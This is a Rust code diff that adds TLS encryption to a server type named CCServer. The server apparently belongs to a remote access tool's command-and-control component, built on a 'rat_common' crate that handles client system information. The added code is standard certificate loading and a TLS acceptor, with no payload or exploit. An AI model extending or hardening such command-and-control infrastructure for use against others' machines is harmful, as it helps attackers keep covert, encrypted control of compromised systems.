@@ -22,8 +22,12 @@ use rat_common::schema::{
     SystemInfo,
 };
 use rat_common::snowflake::SnowflakeId;
+use rustls::ServerConfig;
+use rustls::pki_types::pem::PemObject;
+use rustls::pki_types::{CertificateDer, PrivateKeyDer};
 use tokio::net::{TcpListener, TcpStream, ToSocketAddrs};
 use tokio::sync::RwLock;
+use tokio_rustls::TlsAcceptor;
 use tokio_stream::wrappers::ReceiverStream;
 
 use crate::config::Config;
@@ -33,16 +37,27 @@ pub struct CCServer {
     _listener: TcpListener,
     _config: Config,
     _clients: RwLock<HashMap<SocketAddr, Arc<ClientConnector>>>,
+    _acceptor: TlsAcceptor,
     _state: Arc<ModuleState>,
 }
 
 impl CCServer {
     pub async fn bind<A: ToSocketAddrs>(addr: A, config: Config) -> anyhow::Result<Arc<Self>> {
         let listener = TcpListener::bind(addr).await?;
+
+        let certs = CertificateDer::pem_file_iter(config.tls_cc_cert_path.as_ref())?
+            .collect::<Result<Vec<CertificateDer<'_>>, _>>()?;
+        let key = PrivateKeyDer::from_pem_file(config.tls_cc_key_path.as_ref())?;
+        let tls = ServerConfig::builder()
+            .with_no_client_auth()
+            .with_single_cert(certs, key)?;
+        let acceptor = TlsAcceptor::from(Arc::new(tls));
+
         Ok(Arc::new(Self {
             _listener: listener,
             _config: config,
             _clients: RwLock::new(HashMap::new()),
+            _acceptor: acceptor,
             _state: ModuleState::new(),
         }))
     }
@@ -250,6 +265,8 @@ impl ModuleImpl for CCServer {
 
     async fn handle(self: Arc<Self>, event: Self::EventType) -> anyhow::Result<()> {
         let (stream, addr) = event?;
+        let acceptor = self._acceptor.clone();
+        let stream = acceptor.accept(stream).await?;
 
         let mut clients = self._clients.write().await;
         if let Entry::Vacant(e) = clients.entry(addr) {
